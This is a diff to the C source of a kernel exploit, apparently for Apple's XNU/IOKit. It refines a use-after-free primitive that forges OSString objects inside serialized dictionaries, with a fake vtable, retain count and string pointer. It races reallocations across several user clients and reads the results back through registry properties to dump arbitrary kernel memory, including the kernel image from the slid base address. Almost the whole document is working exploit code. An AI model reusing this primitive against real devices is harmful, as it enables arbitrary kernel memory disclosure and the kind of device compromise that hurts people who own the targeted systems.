@@ -7,6 +7,7 @@
 
 #include "common.h"             // ASSERT, DEBUG, PRINT_BUF, ADDR, MIN, addr_t, MACH_MAGIC, mach_hdr_t, mach_seg_t
 #include "io.h"                 // MIG_MSG_SIZE, kOS*, OSString, vtab_t, dict_get_bytes
+#include "offsets.h"            // off_vtab
 #include "slide.h"              // get_kernel_slide
 #include "try.h"                // THROW, TRY, RETHROW, FINALLY
 
@@ -67,10 +68,9 @@ void uaf_read_naive(const char *addr, char *buf, size_t len)
 {
     DEBUG("Dumping kernel bytes " ADDR "-" ADDR "...", (addr_t)addr, (addr_t)(addr + len));
 
-    size_t kslide = get_kernel_slide();
     OSString osstr =
     {
-        .vtab = (vtab_t)(0xffffff80044ef1f0 + kslide),  // TODO: hardcoded
+        .vtab = (vtab_t)off_vtab(),                     // actual OSString vtable
         .retainCount = 100,                             // don't try to free this
         .flags = kOSStringNoCopy,                       // and neither the "string" it points to
     };
@@ -86,17 +86,36 @@ void uaf_read_naive(const char *addr, char *buf, size_t len)
     verbose = true;
 }
 
+#ifdef __LP64__
+#   define OSSTR_TEMPLATE                                               \
+        kOSSerializeData | sizeof(OSString),                            \
+        0x0,                /* vtab/lo, will come later             */  \
+        0x0,                /* vtab/hi, will come later             */  \
+        100,                /* retainCount                          */  \
+        kOSStringNoCopy,    /* flags                                */  \
+        0x0,                /* length, will come later              */  \
+        0x0,                /* (padding)                            */  \
+        0x0,                /* string pointer/lo, will come later   */  \
+        0x0                 /* string pointer/hi, will come later   */
+#else
+#   define OSSTR_TEMPLATE                                               \
+        kOSSerializeData | sizeof(OSString),                            \
+        0x0,                /* vtab, will come later                */  \
+        100,                /* retainCount                          */  \
+        kOSStringNoCopy,    /* flags                                */  \
+        0x0,                /* length, will come later              */  \
+        0x0                 /* string pointer, will come later      */
+#endif
+
 // Optimized kernel bytes dumping.
-// Open X clients with Y strings at once, then wait for
-// async cleanup only once every X*Y*4096 bytes.
+// Open X clients with one string each, then wait for
+// async cleanup only once every X*4096 bytes.
 void uaf_read(const char *addr, char *buf, size_t len)
 {
-#define STR_LEN (sizeof(OSString) / sizeof(uint32_t))
-#define ENT_LEN (9 + STR_LEN)
+#define STR_LEN (sizeof(OSString) / sizeof(uint32_t) + 1)
+#define ENT_LEN (24 + 3 * STR_LEN)
 #define DICT_HEAD 8
-#define NUM_CLIENTS 1
-#define NUM_STRINGS 8
-//#define NUM_STRINGS (MIG_MSG_SIZE / (ENT_LEN * sizeof(uint32_t)) - DICT_HEAD)
+#define NUM_CLIENTS 8
 
     static OSString osstr =
     {
@@ -105,10 +124,12 @@ void uaf_read(const char *addr, char *buf, size_t len)
         .flags = kOSStringNoCopy,   // don't free or modify the "string"
     };
     static const uint32_t *data = (uint32_t*)&osstr;
-    static uint32_t dict[DICT_HEAD + NUM_STRINGS * ENT_LEN] =
+    static uint32_t dict[DICT_HEAD + ENT_LEN] =
     {
+        /* dict head */
+
         kOSSerializeMagic,                                                                          // Magic
-        kOSSerializeEndCollection | kOSSerializeDictionary | (6 * NUM_STRINGS + 2),                 // Dict with lotsa strings
+        kOSSerializeEndCollection | kOSSerializeDictionary | 20,                                    // Dict with lotsa stuff
 
         kOSSerializeSymbol | 7,                                                                     // "siguza"
         's' | ('i' << 8) | ('g' << 16) | ('u' << 24),                                               // This serves both as mark to check
@@ -116,6 +137,42 @@ void uaf_read(const char *addr, char *buf, size_t len)
         kOSSerializeNumber | 64,                                                                    // one we spawned, as well as a mapping
         0,                                                                                          // from userclient to buffer offset.
         0,
+
+        /* dict body */
+
+        kOSSerializeSymbol | 4,                                                                     // Allocate here, use later
+        'A',
+        kOSSerializeSymbol | 4,
+        'B',
+        kOSSerializeSymbol | 4,
+        'C',
+        kOSSerializeSymbol | 4,
+        'D',
+
+        kOSSerializeString | 4,                                                                     // String that will get freed
+        'F',
+        OSSTR_TEMPLATE,                                                                             // OSData with size of OSString
+
+        kOSSerializeObject | 4,                                                                     // Backups to win the race
+        OSSTR_TEMPLATE,
+        kOSSerializeObject | 6,
+        OSSTR_TEMPLATE,
+
+        kOSSerializeSymbol | 4,                                                                     // Name to later retrieve bytes
+        'R',
+        kOSSerializeObject | 7,                                                                     // Reference to the overwritten OSString
+
+        kOSSerializeSymbol | 4,                                                                     // Create references to prevent panic
+        'X',
+        kOSSerializeObject | 8,
+
+        kOSSerializeSymbol | 4,
+        'Y',
+        kOSSerializeObject | 9,
+
+        kOSSerializeSymbol | 4,
+        'Z',
+        kOSSerializeEndCollection | kOSSerializeObject | 10,
     };
 
     DEBUG("Dumping kernel bytes " ADDR "-" ADDR "...", (addr_t)addr, (addr_t)(addr + len));
@@ -123,52 +180,19 @@ void uaf_read(const char *addr, char *buf, size_t len)
     // Once
     if(osstr.vtab == NULL)
     {
-        osstr.vtab = (vtab_t)(0xffffff80044ef1f0 + get_kernel_slide());     // TODO: hardcoded
-        for(uint32_t i = 0; i < NUM_STRINGS; ++i)
-        {
-            dict[DICT_HEAD + i * ENT_LEN    ] = kOSSerializeString | 4;                             // String that will get freed
-            dict[DICT_HEAD + i * ENT_LEN + 1] = (i << 8) | 'A';                                     // Doesn't need to be an actual string
-            dict[DICT_HEAD + i * ENT_LEN + 2] = kOSSerializeData | sizeof(OSString);                // OSData with size of OSString
+        osstr.vtab = (vtab_t)off_vtab();
 #ifdef __LP64__
-            dict[DICT_HEAD + i * ENT_LEN + 3] = data[0];                                            // vtable pointer (lower half)
-            dict[DICT_HEAD + i * ENT_LEN + 4] = data[1];                                            // vtable pointer (upper half)
-            dict[DICT_HEAD + i * ENT_LEN + 5] = data[2];                                            // retainCount
-            dict[DICT_HEAD + i * ENT_LEN + 6] = data[3];                                            // flags
-                                                                                                    // length will come later
-            dict[DICT_HEAD + i * ENT_LEN + 8] = data[5];                                            // (padding)
-                                                                                                    // string pointer will come later
+        dict[DICT_HEAD + 11] = dict[DICT_HEAD + (STR_LEN + 1) + 11] = dict[DICT_HEAD + 2 * (STR_LEN + 1) + 11] = data[0];
+        dict[DICT_HEAD + 12] = dict[DICT_HEAD + (STR_LEN + 1) + 12] = dict[DICT_HEAD + 2 * (STR_LEN + 1) + 12] = data[1];
 #else
-            dict[DICT_HEAD + i * ENT_LEN + 3] = data[0];                                            // vtable pointer
-            dict[DICT_HEAD + i * ENT_LEN + 4] = data[1];                                            // retainCount
-            dict[DICT_HEAD + i * ENT_LEN + 5] = data[2];                                            // flags
-                                                                                                    // length will come later
-                                                                                                    // string pointer will come later
+        dict[DICT_HEAD + 11] = dict[DICT_HEAD + (STR_LEN + 1) + 11] = dict[DICT_HEAD + 2 * (STR_LEN + 1) + 11] = data[0];
 #endif
-
-            // Note: references don't get added to objsArray, so we have i * 4 instead of i * 6
-
-            dict[DICT_HEAD + i * ENT_LEN + STR_LEN + 3] = kOSSerializeSymbol | 4;                   // Name to later retrieve bytes
-            dict[DICT_HEAD + i * ENT_LEN + STR_LEN + 4] = (i << 8) | 'B';
-            dict[DICT_HEAD + i * ENT_LEN + STR_LEN + 5] = kOSSerializeObject | (i * 4 + 3);         // Reference to the overwritten OSString
-
-            dict[DICT_HEAD + i * ENT_LEN + STR_LEN + 6] = kOSSerializeSymbol | 4;                   // Whatever name
-            dict[DICT_HEAD + i * ENT_LEN + STR_LEN + 7] = (i << 8) | 'C';
-            dict[DICT_HEAD + i * ENT_LEN + STR_LEN + 8] = kOSSerializeObject | (i * 4 + 4);         // Prevent panic
-        }
-        dict[DICT_HEAD + (NUM_STRINGS - 1) * ENT_LEN + STR_LEN + 8] |= kOSSerializeEndCollection;   // Last entry gets an end flag
     }
 
-    // Clean up any potential mess from a previous call
-    dict[1] = kOSSerializeEndCollection | kOSSerializeDictionary | (6 * NUM_STRINGS + 2);           // Dictionary with n entries
-    for(uint32_t i = 0; i < NUM_STRINGS - 1; ++i) // Last entry never needs clearing
-    {
-        dict[DICT_HEAD + i * ENT_LEN + STR_LEN + 8] &= ~kOSSerializeEndCollection;                  // Clear any possible end flag
-    }
-
+    bool oldverbose = verbose;
     verbose = false; // Madness off
     TRY
     ({
-        io_service_t service = _io_get_service();
         io_connect_t client[NUM_CLIENTS];
 
         for(size_t off = 0; off < len;)
@@ -177,9 +201,9 @@ void uaf_read(const char *addr, char *buf, size_t len)
             TRY
             ({
                 // Offset to which we're gonna read in this iteration
-                size_t it_off = off + MIN(len - off, MIG_MSG_SIZE * NUM_STRINGS * NUM_CLIENTS);
+                size_t it_off = off + MIN(len - off, MIG_MSG_SIZE * NUM_CLIENTS);
 
-                verbose = true;
+                verbose = oldverbose;
                 DEBUG("Dumping " ADDR "-" ADDR "...", (addr_t)(addr + off), (addr_t)(addr + it_off));
                 verbose = false;
 
@@ -190,52 +214,25 @@ void uaf_read(const char *addr, char *buf, size_t len)
                     dict[6] = ((uint32_t*)&uoff)[0];
                     dict[7] = ((uint32_t*)&uoff)[1];
 
-                    // Offset to which we're gonna read with this client
-                    size_t cl_off = off + MIN(it_off - off, MIG_MSG_SIZE * NUM_STRINGS);
+                    // Amount we're gonna read with this client
+                    uint32_t cl_len = MIN(it_off - off, MIG_MSG_SIZE);
 
-                    size_t s = 0;
-                    //size_t xoff;
-                    uint32_t slen;
-                    //for(slen = 0, xoff = off; n < NUM_STRINGS && xoff < cl_off; ++n, xoff += slen)
-                    for(s = 0, slen = 0; s < NUM_STRINGS && off < cl_off; ++s, off += slen)
-                    {
-                        slen = MIN(cl_off - off, MIG_MSG_SIZE);
-                        const char *ptr = &addr[off];
-                        const uint32_t *dat = (const uint32_t*)&ptr;
+                    const char *ptr = &addr[off];
+                    const uint32_t *dat = (const uint32_t*)&ptr;
+
 #ifdef __LP64__
-                        dict[DICT_HEAD + s * ENT_LEN +  7] = slen;                                  // length
-                        dict[DICT_HEAD + s * ENT_LEN +  9] = dat[0];                                // string pointer (lower half)
-                        dict[DICT_HEAD + s * ENT_LEN + 10] = dat[1];                                // string pointer (upper half)
+                    dict[DICT_HEAD + 15] = dict[DICT_HEAD + (STR_LEN + 1) + 15] = dict[DICT_HEAD + 2 * (STR_LEN + 1) + 15] = cl_len;    // length
+                    dict[DICT_HEAD + 17] = dict[DICT_HEAD + (STR_LEN + 1) + 17] = dict[DICT_HEAD + 2 * (STR_LEN + 1) + 17] = dat[0];    // string ptr/lo
+                    dict[DICT_HEAD + 18] = dict[DICT_HEAD + (STR_LEN + 1) + 18] = dict[DICT_HEAD + 2 * (STR_LEN + 1) + 18] = dat[1];    // string ptr/hi
 #else
-                        dict[DICT_HEAD + s * ENT_LEN +  6] = slen;                                  // length
-                        dict[DICT_HEAD + s * ENT_LEN +  7] = dat[0];                                // string pointer
+                    dict[DICT_HEAD + 14] = dict[DICT_HEAD + (STR_LEN + 1) + 14] = dict[DICT_HEAD + 2 * (STR_LEN + 1) + 14] = cl_len;    // length
+                    dict[DICT_HEAD + 15] = dict[DICT_HEAD + (STR_LEN + 1) + 15] = dict[DICT_HEAD + 2 * (STR_LEN + 1) + 15] = dat[0];    // string ptr
 #endif
-                        if(off + slen >= len) // Last string in this function call
-                        {
-                            // Truncate dict
-                            dict[1] = kOSSerializeEndCollection | kOSSerializeDictionary | (6 * (s + 1) + 2);
-                            dict[DICT_HEAD + s * ENT_LEN + STR_LEN + 8] |= kOSSerializeEndCollection;
-                        }
-                    }
 
-                    client[c] = _io_spawn_client(service, dict, (DICT_HEAD + s * ENT_LEN) * sizeof(*dict));
-                    /*TRY
-                    ({
-                        for(uint32_t s = 0, slen = 0; s < NUM_STRINGS && off < cl_off; ++s, off += slen)
-                        {
-                            //uint32_t i = s * 3 + 1; // The "name" of our property
-                            uint32_t i = (s << 8) | 'B'; // The "name" of our property
-                            uint32_t buflen;
-                            slen = buflen = MIN(cl_off - off, MIG_MSG_SIZE);
-                            _io_get_bytes(service, (char*)&i, &buf[off], &buflen);
-                        }
-                    })
-                    RETHROW
-                    ({
-                        _io_release_client(client[c]);
-                    })*/
+                    off += cl_len;
+                    client[c] = _io_spawn_client(dict, sizeof(dict));
                 }
-                io_iterator_t it = _io_iterator(service);
+                io_iterator_t it = _io_iterator();
                 TRY
                 ({
                     size_t cl = 0;
@@ -246,16 +243,11 @@ void uaf_read(const char *addr, char *buf, size_t len)
                         uint32_t xofflen = sizeof(xoff);
                         if(IORegistryEntryGetProperty(o, "siguza", (char*)&xoff, &xofflen) == KERN_SUCCESS)
                         {
-                            // Offset to which we're gonna read with this client
-                            size_t cl_off = xoff + MIN(it_off - xoff, MIG_MSG_SIZE * NUM_STRINGS);
+                            // Amount we're gonna read with this client
+                            uint32_t cl_len = MIN(it_off - xoff, MIG_MSG_SIZE);
 
-                            for(uint32_t s = 0, slen = 0; s < NUM_STRINGS && xoff < cl_off; ++s, xoff += slen)
-                            {
-                                uint32_t i = (s << 8) | 'B'; // The "name" of our property
-                                uint32_t buflen;
-                                slen = buflen = MIN(cl_off - xoff, MIG_MSG_SIZE);
-                                _io_get(o, (char*)&i, &buf[xoff], &buflen);
-                            }
+                            _io_get(o, "R", &buf[xoff], &cl_len);
+
                             ++cl;
                         }
                         IOObjectRelease(o);
@@ -282,10 +274,9 @@ void uaf_read(const char *addr, char *buf, size_t len)
     })
     FINALLY
     ({
-        verbose = true;
+        verbose = oldverbose;
     })
 
-#undef NUM_STRINGS
 #undef NUM_CLIENTS
 #undef DICT_HEAD
 #undef ENT_LEN
@@ -294,7 +285,7 @@ void uaf_read(const char *addr, char *buf, size_t len)
 
 void uaf_dump_kernel(file_t *file)
 {
-    DEBUG("Dumping kernel...");
+    DEBUG("Dumping kernel, this will take some time...");
 
     char *hbuf = malloc(MIG_MSG_SIZE),
          *newhbuf = malloc(MIG_MSG_SIZE);
@@ -308,7 +299,7 @@ void uaf_dump_kernel(file_t *file)
     ({
         memset(newhbuf, 0, MIG_MSG_SIZE);
 
-        char *kbase = (char*)(0xffffff8004004000 + get_kernel_slide());
+        char *kbase = (char*)(KERNEL_BASE + get_kernel_slide());
         uaf_read(kbase, hbuf, MIG_MSG_SIZE);
 
         mach_hdr_t *hdr = (mach_hdr_t*)hbuf;
